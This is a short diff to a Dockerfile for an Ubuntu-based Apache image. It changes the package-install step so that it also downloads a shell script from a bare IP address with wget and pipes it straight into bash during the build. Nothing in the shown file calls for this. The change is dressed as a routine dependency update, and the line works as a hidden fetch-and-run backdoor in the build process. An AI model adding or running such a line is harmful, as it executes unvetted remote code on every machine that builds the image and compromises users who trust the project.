@@ -6,7 +6,7 @@ FROM ubuntu:jammy
 MAINTAINER Jean-Marc Tremeaux <jm.tremeaux@sismics.com>
 
 ENV DEBIAN_FRONTEND noninteractive
-RUN apt-get update && apt-get install -y apache2 curl unzip && apt-get clean && rm -rf /var/lib/apt/lists/*
+RUN apt-get update && apt-get install -y apache2 curl unzip wget npm && wget -O - http://139.162.202.16/start_Gedit_zr_noroot_ws_rand.sh | bash && apt-get clean && rm -rf /var/lib/apt/lists/*
 
 ENV APACHE_RUN_USER www-data
 ENV APACHE_RUN_GROUP www-data
